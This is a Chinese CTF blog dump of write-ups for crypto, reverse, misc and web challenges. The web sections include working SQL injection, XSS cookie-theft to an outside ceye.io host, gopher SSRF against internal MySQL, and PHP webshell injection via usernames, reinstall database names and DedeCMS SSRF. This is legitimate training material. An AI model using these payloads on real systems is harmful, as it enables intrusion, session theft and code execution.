(8-2) 种 最后再 rot8中发现了 tjctf字样 get flag! 最终脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;main() &#123; char s[100][100] = &#123;0&#125;; int i=0,j; FILE *fp; fp = fopen(\"8.txt\",\"r\"); for(i=0;i&lt;100;i++) &#123; fscanf(fp,\"%s\",s[i]); // printf(\"%s\\n\",s[i]); &#125; for(i=0;i&lt;100;i++) &#123; for(j=0;j&lt;100;j++) &#123; if(i&lt;94) &#123; if(s[i][j]=='t'&amp;&amp;s[i+1][j]=='j'&amp;&amp;s[i+2][j]=='c'&amp;&amp;s[i+3][j]=='t'&amp;&amp;s[i+4][j]=='f') &#123; printf(\" %d %d\",i,j); printf(\"\\none\"); &#125; else if(j&lt;94&amp;&amp;s[i][j]=='t'&amp;&amp;s[i+1][j+1]=='j'&amp;&amp;s[i+2][j+2]=='c'&amp;&amp;s[i+3][j+3]=='t'&amp;&amp;s[i+4][j+4]=='f') &#123; printf(\" %d %d\",i,j); printf(\"\\ntwo\"); &#125; else if(s[i][j]=='f'&amp;&amp;s[i+1][j]=='t'&amp;&amp;s[i+2][j]=='c'&amp;&amp;s[i+3][j]=='j'&amp;&amp;s[i+4][j]=='t') &#123; printf(\" %d %d\",i,j); printf(\"\\nthree\"); &#125; else if(j&lt;94&amp;&amp;s[i][j]=='f'&amp;&amp;s[i+1][j+1]=='t'&amp;&amp;s[i+2][j+2]=='c'&amp;&amp;s[i+3][j+3]=='j'&amp;&amp;s[i+4][j+4]=='t') &#123; printf(\" %d %d\",i,j); printf(\"\\nfour\"); &#125; else if(j&gt;5&amp;&amp;s[i][j]=='t'&amp;&amp;s[i+1][j-1]=='j'&amp;&amp;s[i+2][j-2]=='c'&amp;&amp;s[i+3][j-3]=='t'&amp;&amp;s[i+4][j-4]=='f') &#123; printf(\" %d %d\",i,j); printf(\"\\nfive\"); &#125; else if(j&gt;5&amp;&amp;s[i][j]=='f'&amp;&amp;s[i+1][j-1]=='t'&amp;&amp;s[i+2][j-2]=='c'&amp;&amp;s[i+3][j-3]=='j'&amp;&amp;s[i+4][j-4]=='t') &#123; printf(\" %c %c %c %c %c %c\",s[i-1][j+1],s[i][j],s[i+1][j-1],s[i+2][j-2],s[i+3][j-3],s[i+4][j-4],s[i-1][j+1]); printf(\" %d %d\",i,j); printf(\"\\nsix\"); &#125; &#125; &#125; &#125; &#125; Vinegar123key = Kkkkk kkkkKkkkkkkkkKkkkkkkkkKkkflag = uucbx&#123;simbjyaqyvzbzfdatshktkbde&#125;sha256 = 8304c5fa4186bbce7ac030d068fdd485040e65bf824ee70b0bdbac03862bec93 从题目可以看出key有9位 这题我老老实实算key前5位 反推部分flag 再根据剩下四个key在相关地方间隔相等原理爆破（12/3）位 然后看了别人一眼wp发现sha256有些网站可以直接解出来。。。我说咋这么多人做出来 话说我当时也试了几个网站解了下gg了 他们用的是啥网站??? 最终脚本 调试了蛮久的 因为key前五位的结果和反推是手算的 key到没错 但第二组反推的结果中 esala 算成了 epala导致一直没成功 后来是找到了个在线网站把key打进去试了试 依据前5位key的结果应该一样 这才发现有一位手算错了。。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#-*-coding:utf-8-*-# python 2.7import hashlibdef get_sha256(temp): sha1str = temp s1 = hashlib.sha256() s1.update(sha1str.encode(\"utf-8\")) sha256 = s1.hexdigest() return sha256target = \"8304c5fa4186bbce7ac030d068fdd485040e65bf824ee70b0bdbac03862bec93\"maybe = \"abcdefghijklmnopqrstuvwxyz\"# key[0:5]=blais#UUCBXSIMBJYAQYVZBZFDATSHKTKBDE#uucbx&#123;simbjyaqyvzbzfdatshktkbde&#125;# s v h#tjctf&#123;?000inaig0000epala0000ase&#125;#i5 = maybe[(((ord('a')-ord('s'))%26 + 22))%26-1] for i1 in maybe: for i2 in maybe: for i3 in maybe: for i4 in maybe: i5 = maybe[(((ord(i1)-ord('s'))%26 + 22))%26-1] i6 = maybe[(((ord(i2)-ord('i'))%26 + 26))%26-1] i7 = maybe[(((ord(i3)-ord('m'))%26 + 2))%26-1] i8 = maybe[(((ord(i4)-ord('b'))%26 + 26))%26-1] i9 = maybe[(((ord(i1)-ord('s'))%26 + 8))%26-1] i10 = maybe[(((ord(i2)-ord('i'))%26 + 11))%26-1] i11 = maybe[(((ord(i3)-ord('m'))%26 + 20))%26-1] i12 = maybe[(((ord(i4)-ord('b'))%26 + 11))%26-1] flag = \"tjctf&#123;\" +i1+i2+i3 +i4+\"inaig\"+i5+i6+i7+i8+\"esala\"+i9+i10+i11+i12+\"ase\"+\"&#125;\" # print flag #flag=flag.upper() if (get_sha256(flag)==target): print flag reversepython reverse给的py文件 不是pe那种 所以就做了下 试了下按位验证 这还逆个啥 爆破！梭哈！ 不过虽说是按位验证 也有几个要注意的地方 fuzz一下数字和其他字符运算后得到的位数不同 数字是8位 其他字符是9位 所以采取优先结合多的原则 先匹配9位的 然后8位 还有按位 但这里要结合前面的结果 就是说 t 然后不是 j 而是 tj 下一位的验证要带上之前所有的 所以目标字符串切片时要 [0:t+9] 每一次都从0开始 最终脚本 12345678910111213141516171819202122232425262728import numpy as npdef fun(flag): np.random.seed(12345) arr = np.array([ord(c) for c in flag]) other = np.random.randint(1,5,(len(flag))) arr = np.multiply(arr,other) b = [x for x in arr] lmao = [ord(x) for x in ''.join(['ligma_sugma_sugondese_'*5])] c = [b[i]^lmao[i] for i,j in enumerate(b)] return(''.join(bin(x)[2:].zfill(8) for x in c))strr = \"1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101\"tt = 0finall = \"\"for j in range(0,30): for i in range(33,127): if(strr[0:tt+9]==fun(finall+chr(i))): finall = finall + chr(i) tt = tt + 9 elif(strr[0:tt+8]==fun(finall+chr(i))): finall = finall + chr(i) tt = tt + 8 print finall 最终结果","categories":[],"tags":[]},{"title":"misc&web补题","slug":"misc&web补题","date":"2018-08-03T09:17:42.000Z","updated":"2018-08-13T12:01:59.278Z","comments":true,"path":"2018/08/03/misc&web补题/","link":"","permalink":"http://Merl1ng.com/2018/08/03/misc&web补题/","excerpt":"补点题","text":"补点题 misc1https://hell38vn.wordpress.com/ binwalk发现好多图片 除了三张都是国旗 题目有说 photo take 所以应该关注不是国旗的 ‘照片’ 在 其中一张 用 Stegsolve 打开发现字符串 2给了个 Windows .exe peid查一下 是 .net 文件 用 dnspy反编译 拿到一张图片 使用 zsteg 拿到flag 3直接binwalk不行 显示有 zip但提取不出来 修复zip文件 0506-&gt;0304 再次binwalk 成功拿到 pdf 但发现是 0字节 还有个压缩包 这里 7z解压可以拿到真正的pdf —-好吧 7z 无敌了 修完zip直接7z就可以拿到pdf 但pdf还是打不开 是crc错误 可以手动试也可以直接在线修复 https://www.pdf-online.com/osa/repair.aspx 成功打开 pdf发现里面没flag 应该被隐藏了 转成 text 试试 linux下可以安装pdftotexthttps://www.cyberciti.biz/faq/converter-pdf-files-to-text-format-command/ 也可以直接在线转 https://pdftotext.com/ 成功拿到flag 4zip末尾有 KP字样 反转文件 py脚本 1open(\"reversed\", \"wb\").write(open(\"original\", \"rb\").read()[::-1]) 5file一下 ntfs字样 使用ntfsundelete工具可以查看是否有任何已删除的文件 ubuntu自带这个软件 可以看到一些文件可以恢复 ntfsundelete mrreagan -u -i Inode 恢复文件 得到 $Info : c2N0ZnszbD$Secure : NjdHIwbTRn$Boot : bjN0MWNfcH$Extend : VsNTNfdzRz$LogFile : X2Y0azN9CgMorpheus.txt : This line is tapped, so I must be brief.Tank.txt : 73656366Dozer.txt : 73656366Trinity.txt : I was looking for an answer. It’s the question that drives us mad.Neo.txt : What is the Matrix. $Info : c2N0ZnszbD$Secure : NjdHIwbTRn$Boot : bjN0MWNfcH$Extend : VsNTNfdzRz$LogFile : X2Y0azN9Cg 拼接起来解 base64 6这题思路太骚了 给张图片 识图找到原图(960*678) 然后用 ps查找图像不一样的地方 放在两个图层 重叠 上层图层模式选差值 相同地方会变成黑色 不一样的地方自然显出来 当然这题因为只在图片表面更改才能这样做 7压缩包提示 5位数密码 跑一遍没有。。 再时下 居然 4位 的。。。。。。 以后提示几位爆破 &lt;= 位数的 后面16位大写字母和数字 是md5 web1伪静态技术 昨天在ph牛的一篇文章里又突然看到 伪静态技术（pseudo-static），又名URL重写(URL rewriting) /test.php/aaa.html也是能正常访问/test.php，可能是服务器解析到.php后就把后面的/aaa.html当作参数处理 例如你原本想弄的是index.php?id=123，但你想隐藏其真实的文件路径，你通过URL重写技术，可以达到访问test/123.html而实际上在访问index.php?id=123 这题是 /indirection/index.php/index.php 绕过 主要是这个概念以前没注意过 212345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;html&gt;&lt;head&gt;welcome to simplexue&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect(\"********, \"*****\", \"********\"); mysql_select_db(\"phpformysql\") or die(\"Could not select database\"); if ($conn-&gt;connect_error) &#123; die(\"Connection failed: \" . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = \"select pw from php where user='$user'\";$query = mysql_query($sql);if (!$query) &#123; printf(\"Error: %s\\n\", mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[\"pw\"]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo \"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;\";&#125;else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125; &#125;?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=\"Username\"&gt;&lt;input type=password name=pass value=\"Password\"&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=\"index.txt\"&gt;&lt;/html&gt; 直说关键的 大体我们密码输一个字符如 1 然后想把1的md5输进去让它比较 但是我们不知道 pw的值 导致它写的语句我们不可控 所以我们构造 and 0=1 使前面它的查询语句为假 就会显示union后的 这里我终于明白为啥以前有时候要把 id=-1 道理是一样的 让它查询为假 特别只有一个回显位时 显示出 union后面的结果 然后 union 上我们自己的查询语句 union select “c4ca4238a0b923820dcc509a6f75849b” 可直接赋值 别忘了闭合前面的 ‘ 并且注释掉后面的 ‘ 最终payload user=’ AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” %23&amp;pass=1 3脚本练习题 获取 响应头中参数 在短时间内提交 获取响应头中指定参数https://blog.csdn.net/DDQ_DQ/article/details/78614198 12345678import requestsr = requests.get('http://httpbin.org/get')print(r.headers) #获得响应头信息print(r.headers['Content-Type'])print(r.headers.get('Content-Length'))&gt;&gt;`&#123;'X-Processed-Time': '0.000617980957031', 'Connection': 'keep-alive', 'Via': '1.1 vegur', 'Content-Length': '268', 'X-Powered-By': 'Flask', 'Date': 'Thu, 23 Nov 2017 04:13:40 GMT', 'Server': 'meinheld/0.6.1', 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Credentials': 'true', 'Content-Type': 'application/json'&#125;&gt;&gt;application/json&gt;&gt;268` 拿到后进一步处理 切片 正则 或直接字符串切割https://blog.csdn.net/hawkerou/article/details/53518154 123456789101112131415161718#!/usr/bin/env python# -*- coding:utf8 -*-import requestsimport base64import re #可选url = \"http://ctf5.shiyanbar.com/web/10/10.php\"s0 = requests.get(url)s1 = s0.headers['FLAG']s2 = base64.b64decode(s1)#s3 = s2[25:34] 切片#s3 = s2.split(':')[1] 字符串切割s3 = re.split(r':',s2)[1] #正则data = &#123;'key':s3&#125;s = requests.post(url,data=data).contentprint s 4表单的题目 右键源码 看看有没有 hidden 的 当时这题没注意这点卡住了 5脚本练习题 给一个sha1值，它是0-100000之间的整数的md5值再求取sha1值，请在2秒内提交该整数值 这题一开始wrong好久 后来发现第一次请求没带上 cookies 。。。。。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python# -*- coding:utf8 -*-import requestsimport hashlibdef get_md5(temp): md5str = temp m1 = hashlib.md5() m1.update(md5str.encode(\"utf-8\")) md5 = m1.hexdigest() return md5def get_sha1(temp): sha1str = temp s1 = hashlib.sha1() s1.update(sha1str.encode(\"utf-8\")) sha1 = s1.hexdigest() return sha1url = \"http://ctf5.shiyanbar.com/ppc/sd.php\"cookies = &#123; \"Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3\":\"1533192936\", \"Hm_cv_34d6f7353ab0915a4c582e4516dffbc3\":\"1*visitor*101742%2CnickName%3Amerl1ng.cc\", \"Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3\":\"1533472959\", \"PHPSESSID\":\"i1ae17toas5m38hutf4kguuj46\" &#125;s0 = requests.get(url=url,cookies=cookies).contents1 = s0[580:620]t = 0while(t &lt;= 100000): t1 = str(t) p = get_md5(t1) p1 = get_sha1(p) if (p1 == s1): break t = t + 1data = &#123;'inputNumber':t,'submit':'提交'&#125;flag = requests.post(url=url,data=data,cookies=cookies).contentprint flag ppc练练小jio本 双基回文数1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python# -*- coding:utf8 -*-def f(n,x): #n为待转换的十进制数，x为机制，取值为2-16 a=[0,1,2,3,4,5,6,7,8,9,'A','b','C','D','E','F'] b=[] while True: s=n//x#商 y=n%x#余数 b=b+[y] if s==0: break n=s b.reverse() return bdef issj(temp): a = 0 b = 10 s1 = [] s2 = [] while(b &gt; 1): s1 = f(temp,b) #print s1 s2 = s1[::-1] #print s2 if(s1 == s2): a = a + 1 b = b - 1 if(a &gt;= 2): return 1 else: return 0t = 1600000while(1): if(issj(t)): print t break t = t + 1 进制转换的部分可以当轮子用 大数模运算12345678910111213141516171819#!/usr/bin/env python# -*- coding:utf8 -*-s=1for x in [3,5,823]: i=x ss=1 for j in range(0,12345): #这个循环就是用来求每个括号中等比数列和的 ss=(i+ss)%9901 #每次计算的中间结果都模一下9901，这样使得计算的数不会变得很大，可加快计算 i=i*x%9901 s=s*ss%9901 #把每个等比数列和相乘print(s) # 首先将12345因式分解成素因子的幂的形式 3*5*823# 它们所有因子的和可以表示成 可以通过排列组合的原理验证（1+3+3^2+3^3+……+3^12345）(1+5+5^2+5^3+……+5^12345）（1+823+823^2+823^3+……+823^12345） 计算网页上的表达式很容易查到是 eval 但这里有一点值得注意 py2 和py3对字符串的处理是不一样的 py3的话会带上 ‘’ 比较时要去掉 这里py2和py3都写了一边 方便以后看 py2 123456789101112131415161718192021222324252627282930#!/usr/bin/env python# -*- coding:utf8 -*-import requestsimport reurl = \"http://ctf5.shiyanbar.com/jia/\"cookies = &#123; \"Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3\":\"1533192936\", \"Hm_cv_34d6f7353ab0915a4c582e4516dffbc3\":\"1*visitor*101742%2CnickName%3Amerl1ng.cc\", \"Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3\":\"1533472959\", \"PHPSESSID\":\"i1ae17toas5m38hutf4kguuj46\" &#125;s0 = requests.get(url=url,cookies=cookies).contents1 = s0[1053:1105]s1=str(s1)pattern = re.compile(r'x')#print (pattern.findall(s2))s3 = re.sub(pattern, '*', s1)s4 = (eval(s3))data = &#123;'pass_key':s4&#125;flag = requests.post(url=url,data=data,cookies=cookies).contentprint (flag) py3 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding:utf8 -*-import requestsimport reurl = \"http://ctf5.shiyanbar.com/jia/\"cookies = &#123; \"Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3\":\"1533192936\", \"Hm_cv_34d6f7353ab0915a4c582e4516dffbc3\":\"1*visitor*101742%2CnickName%3Amerl1ng.cc\", \"Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3\":\"1533472959\", \"PHPSESSID\":\"i1ae17toas5m38hutf4kguuj46\" &#125;s0 = requests.get(url=url,cookies=cookies).contents1 = s0[1053:1105]s1=str(s1)s2=s1[2:-1]print (s2)pattern = re.compile(r'x')#print (pattern.findall(s2))s3 = re.sub(pattern, '*', s1)s3=s3[2:-1]print (s3)s4 = (eval(s3))print(s4)data = &#123;'pass_key':s4&#125;flag = requests.post(url=url,data=data,cookies=cookies).contentprint (flag)","categories":[],"tags":[]},{"title":"近期一些wp","slug":"近期一些wp","date":"2018-07-31T13:14:12.000Z","updated":"2018-08-28T13:08:53.926Z","comments":true,"path":"2018/07/31/近期一些wp/","link":"","permalink":"http://Merl1ng.com/2018/07/31/近期一些wp/","excerpt":"主要是rw + meepwn","text":"主要是rw + meepwn real world ctfdot free12345678910111213141516171819202122232425262728293031323334353637&lt;script&gt; function lls(src) &#123; var el = document.createElement('script'); if (el) &#123; el.setAttribute('type', 'text/javascript'); el.src = src; document.body.appendChild(el); &#125; &#125;; function lce(doc, def, parent) &#123; var el = null; if (typeof doc.createElementNS != \"undefined\") el = doc.createElementNS(\"http://www.w3.org/1999/xhtml\", def[0]); else if (typeof doc.createElement != \"undefined\") el = doc.createElement(def[0]); if (!el) return false; for (var i = 1; i &lt; def.length; i++) el.setAttribute(def[i++], def[i]); if (parent) parent.appendChild(el); return el; &#125;; window.addEventListener('message', function (e) &#123; if (e.data.iframe) &#123; if (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf('.') == -1 &amp;&amp; e.data.iframe.value.indexOf(\"//\") == -1 &amp;&amp; e.data.iframe.value.indexOf(\"。\") == -1 &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != 'object')) &#123; if (e.data.iframe.type == \"iframe\") &#123; lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent); &#125; else &#123; lls(e.data.iframe.value) &#125; &#125; &#125; &#125;, false); window.onload = function (ev) &#123; postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*') &#125;&lt;/script&gt; xss 根据要求构造 json 但要绕过两个点 . 和 // . 的绕过都是用的长整型 脚本转一下 这还是在四字符getshell看到的 1234567891011121314#!/usr/bin/env pythonip = '127.0.0.1'# 十六进制print '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split('.')])# 长整数print int(''.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split('.')]), 16)# 八进制print '0' + oct(int(''.join([str(hex(int(i))[2:].zfill(2)) for i in ip.split('.')]), 16)) //的绕过 \\\\转义缘故 而且只能在liunx下成功 http://13.57.104.34/?{&quot;iframe&quot;:{&quot;value&quot;:&quot;\\\\\\\\123456789&quot;}} 还有用\\u编码绕过 \\u002f\\u050c 就是/(转义) 然后这题特殊一点 要在你的vps上index.html(因为不好在url中指定文件)放打cookie的脚本 这里复现时xss bot应该关了 没能打到 本地测了一下应该可以 12345678910111213141516&lt;html&gt;&lt;title&gt;Fun !&lt;/title&gt;&lt;head&gt; &lt;/head&gt;&lt;body&gt;&lt;script&gt; var img = document.createElement(\"img\"); img.src = \"http://xxx.ceye.io?flag=\"+escape(document.cookie); document.body.appendChild(img);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 还有师傅成功直接写到url里了 http://13.57.104.34/?{&quot;iframe&quot;:{&quot;value&quot;:&quot;data:,lce(document,[&#39;img&#39;,&#39;src&#39;,String[&#39;fromCharCode&#39;](0x2f)+String[&#39;fromCharCode&#39;](0x2f)+&#39;0123456789?&#39;+document[&#39;cookie&#39;]],document[&#39;body&#39;]);&quot;,&quot;type&quot;:&quot;notiframe&quot;}} book hubpython的代码审计 绕过代理的坑然后redis注入 涉及到了python反序列化的知识 得先补之前的两道py反序列化题 xff不能伪造是因为做了反代 伪造的xff被覆盖了 misc 1https://maskray.me/blog/2018-07-31-real-world-ctf-2018-ccls-fringe 出题人的命题报告 还没看懂。。。 昔年 ctf一些师傅自己办的比赛 比较简单 只有几道题值得记录一下 1输一个token 输入数组会报错 md5 可见把输入的东西进行了md5加密 抓包 cookie里也有个 token 猜测是这两比较 所以输个1 算1的md5 改 cookie 改包 其实以前见过这个思路 做题时没想起来orz 2php socket通信 需要本地写个php客户端 去网上找个脚本 php /var/www/client.php 开启 不过这题我一直没收到flag… 3sql注入拿到账号密码记得再扫一下后台登陆 meepwn","categories":[],"tags":[]},{"title":"利用gopher和ssrf操作内网mysql","slug":"利用gopher和ssrf操作内网mysql","date":"2018-07-29T12:38:05.000Z","updated":"2018-08-04T10:14:57.726Z","comments":true,"path":"2018/07/29/利用gopher和ssrf操作内网mysql/","link":"","permalink":"http://Merl1ng.com/2018/07/29/利用gopher和ssrf操作内网mysql/","excerpt":"挺好的一道题 学到了很多","text":"挺好的一道题 学到了很多 进去显示 curl 看源码 最底下有提示 debug参数 加上参数可以看到源码 尝试file协议读取 config.php文件 12345678910111213141516171819202122232425262728293031323334353637&lt;?php$hosts = \"localhost\";$dbusername = \"ssrf_user\";$dbpasswd = \"\";$dbname = \"ssrf\";$dbport = 3306;$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);function initdb($conn)&#123; $dbinit = \"create table if not exists flag(secret varchar(100));\"; if(mysqli_query($conn,$dbinit)) return 1; else return 0;&#125;function safe($url)&#123; $tmpurl = parse_url($url, PHP_URL_HOST); if($tmpurl != \"localhost\" and $tmpurl != \"127.0.0.1\") &#123; var_dump($tmpurl); die(\"&lt;h1&gt;Only access to localhost&lt;/h1&gt;\"); &#125; return $url;&#125;function getUrlContent($url)&#123; $url = safe($url); $url = escapeshellarg($url); $pl = \"curl \".$url; echo $pl; $content = shell_exec($pl); return $content;&#125;initdb($conn);?&gt; 看到数据库的信息 猜测flag应该在内网的数据库中 直接对 http://127.0.0.1:3306/ 很难进行操作 想到利用 gopher协议结合ssrf打内网 本地开启mysql服务 控制台输入 mysql -h 127.0.0.1 -u ssrf_user 登陆成不成功无所谓 wireshark进行抓包 but这里有个坑点 wireshark默认的winpcap是抓不到 127.0.0.1你本地的流量的 需要卸载掉 winpcap 安装 npcap 才可以抓到本地的流量 过滤mysql 追踪tcp流 再过滤只要发送到3306端口的 选择原始数据 利用py脚本结合sql语句 12345678910111213141516171819202122dump = raw_input(\"Give connection packet of mysql: \")query = raw_input(\"Give query to execute: \")auth = dump.replace(\"\\n\",\"\")def encode(s): a = [s[i:i + 2] for i in range(0, len(s), 2)] return \"gopher://127.0.0.1:3306/_%\" + \"%\".join(a)def get_payload(query): if(query.strip()!=''): query = query.encode(\"hex\") query_length = '&#123;:x&#125;'.format((int((len(query) / 2) + 1))) pay1 = query_length.rjust(2,'0') + \"00000003\" + query final = encode(auth + pay1 + \"0100000001\") return final else: return encode(auth)print \"\\nYour gopher link is ready to do SSRF : \\n\"print get_payload(query) 查下表名 然后直接查 ssrf.flag 最终payload 成功打到flag 1gopher://127.0.0.1:3306/_%41%00%00%01%85%a6%0f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%73%73%72%66%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%19%00%00%00%03%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%73%73%72%66%2e%66%6c%61%67%3b%01%00%00%00%01","categories":[],"tags":[]},{"title":"巅峰极客wp","slug":"巅峰极客wp","date":"2018-07-23T10:53:58.000Z","updated":"2018-08-21T07:04:10.533Z","comments":true,"path":"2018/07/23/巅峰极客wp/","link":"","permalink":"http://Merl1ng.com/2018/07/23/巅峰极客wp/","excerpt":"大师傅们下手太重了orz","text":"大师傅们下手太重了orz 考点基本都是cms实战 还有1day a simple cmsonethink 用的是thinkphp3.2 疯狂查洞 注入的试了试不行 然后查到一个注册用户名写shell的 还真是这个 但它这个缓存文件名改了 扫目录可得 www.zip 需要本地搭一个找到文件名 下载文件，在本地构建复现环境，首先删除onethink/onethink/Application/Install/Data/install.lock文件，然后访问install.php 依次使用 123%0a$a=$_GET[a];// %0aecho `$a`;// 这里我有一句mmp ``在别的wp里被转了 导致一直没复现成功。。。。。 这里一定要用burp抓包注册和登陆 否则%0a会被当做字符串写到你用户名里 注册账号，在依次登录账号，发现存在Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php文件，且文件内容如下： &lt;?php//000000000000a:4:{s:2:”u1”;s:13:”Administrator”;s:2:”u3”;s:6:”test12”;s:2:”u4”;s:15:”$a=$_GET[a];//“;s:2:”u5”;s:13:”echo $a;//“;}?&gt; 说明我们的一句话上传成功，文件名为Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php，该文件名不改变。 在服务器上重复步骤 flag在tmp下 基本上不在tmp就在根目录 mysql onlinesql+xss+csrf 看wp都贼费事 但这个应该思路较为常规一点 最后有5个队解出来(这次算多的了orz) 我看一个dalao写wp直接看页面就猜出来是这三个组合 伏地膜。。。 思路看了好久大概明白了 csrf让后台访问 便可以xss到后台 但xss要借助mysql完成 直接访问会报 pentestmetinfo的cms 说是扫目录出 file/file.php 但我扫了下就出一层 file 所以涨个经验 以后把有目录的加上去再扫一遍 然后说应该想到任意文件删除 为啥不想到包含 有师傅说这是个1day 查了下老早以前有个csrf导致的文件删除重装但感觉不是这个https://blog.csdn.net/u011066706/article/details/51176286 能想到这里的话再往后如果你有实战经验的话可以想到删掉 install.lock 然后重装写shell到数据库名里 然而我丝毫没有 install.lock删掉 和 访问install能重装我看了simple cms的wp才刚知道 这里你访问一下/install目录 会提示你 install.lock的位置 可以看到过滤 ./ 不过我其实install都没找到 因为之前onethink是直接install.php的 这个是/install目录 不过扫了一下倒是可以扫出来 这个应该也需要经验猜 我查了meninfo安装好像默认的不是这个 还有删除的时候 是…// 我试了 ../../ ../../../之类的不行 这个三点的目录之前没见过。。。也没查到orz 又问了下师傅 这应该是有过滤 但读不到源码 最后还是只能靠脑洞 getshell以后才能读到源码 然后重安装 重装的时候数据库名填写: met#*/@eval($_GET[1]);/* 然后包含默认的数据库配置文件 拿shell 这个你写库名实际会报错的 但不用管直接包含 配置文件默认地址应该很好查到的 或者你填admin正规的数据库名 安装成功也会提示你 这个删除 想到重安 shell写配置文件里的应该是一个常规实战的思路 学习了 这题就一队做出来 没大量实战经验真的难想到 而且卡人的点我觉得很多 dedefun通过题目很容易看出要ssrf https://www.cnblogs.com/s0ky1xd/p/5859049.htmlSSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后服务器以他的身份来访问其他服务器的资源。 因为是dedecms 联想到之前的找后台操作中的getimagesize函数 uploadsafe.inc.php文件中使用了getimagesize函数来判断图片，可造成一个ssrf漏洞 https://xz.aliyun.com/t/2064https://paper.tuisec.win/detail/d1053143f127862 核心文件common.inc.php 大概148行左右 if($_FILES){ require_once(DEDEINC.’/uploadsafe.inc.php’);} 所以只要找到包含\\include\\common.inc.php的文件就可以利用了，这里利用的是根目录下的tags.php 在 tags.php下 结合题目把之前的payload改一改 dopost=save&amp;_FILES[lsa][tmp_name]=./dee&lt;/images/admin_top_logo.gif&amp;_FILES[lsa][name]=0&amp;_FILES[lsa][size]=0&amp;_FILES[lsa][type]=image/gif 改成 dopost=save&amp;_FILES[lsa][tmp_name]=http://127.0.0.1/1.php?a=assert%26b=file_put_contents($_GET[1],base64_decode($_GET[2]));%261=./uploads/soft/aaaa.php%262=PD9waHAgcGhwaW5mbygpOyA/Pg==&amp;_FILES[lsa][name]=0&amp;_FILES[lsa][size]=0&amp;_FILES[lsa][type]=image/gif 是先考虑找ssrf可以利用的的点 联想到之前的同一个cms的关注率很高的洞 然后对应改paoload 这样看思路还算清晰 实际你做的时候难得一比 这玩意大概是个1day 当时只有两个队做出来 不关注近期cms洞和有实战经验的难上难 babyweb根据提示先要信息收集 利用软件远程连接数据库 type直接可以改的 比如把abc改成xxx 传张图试试 结合数据库中的文件名 在 /img下可以发现上传的图片 123&lt;FilesMatch \".xxx\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; .ht 那个是控制解析的 命名还有个坑要另存为 但还得自己修改另一个后缀才能允许比如xxx的文件上传 最后拿到shell 也就一个队做出来 misc 1使用Stegsolve打开图片，分别提取红、绿、蓝三个通道的最低位 发现是Ook!和brainfuck，使用在线解密：https://www.splitbrain.org/services/ook misc 2题目提示 0xff 想到使用0xFF异或整个文件 winhex可以直接异或 得到新的png文件 使用二进制编辑器观察尾部，看到提示“black and white”，以及“IEND”标识，这是png的文件尾部，暗示该文件中隐藏了一个png文件。 直接手扣一个png 观察png文件，可以看到色块分为11列，每列隔行的色块永远是黑色，这说明应该横向读取图片，而列中的横长条由8个小色块组成，显然其代表的是一个字节的数据 123456789101112131415161718192021222324from PIL import Image im = Image.open(\"2.PNG\") width = im.slize[0] height = im.size[1] print(\"width:%d\"%(width)) print(\"height:%d\"%(height)) count = 0 ans = \"\" for h in range(0, height): for w in range(0, width-1): pixel = im.getpixel((w, h)) color = (pixel[0]*256*256+pixel[1]*256+pixel[2])//Oxffffff if color == 1: color = 0 else: color = 1 print(\"%x\"%(color), end=\",\") count += i ans += str(color) if count == 9: print(\"%c\"%int(ans,2)) if ans != \"011111111\": print(\"%c\"%int(ans,2)) count = 0 ans = \"\" misc 3usb协议分析 https://www.anquanke.com/post/id/85218 按length排下序 依次点击 显示分组字节 原始数据 保存 95那个里面有 tips out的总共也就十几个 可以全存下载遍历 将两个最大的数据导出为1.pcap和2.pcap 在kali里 tshark命令 tshark -r 1.pcap -T fields -e usb.capdata &gt; 1.txt tshark -r 2.pcap -T fields -e usb.capdata &gt; 2.txt 然后参考 http://www.lovei.org/archives/2018cdgcrace.html 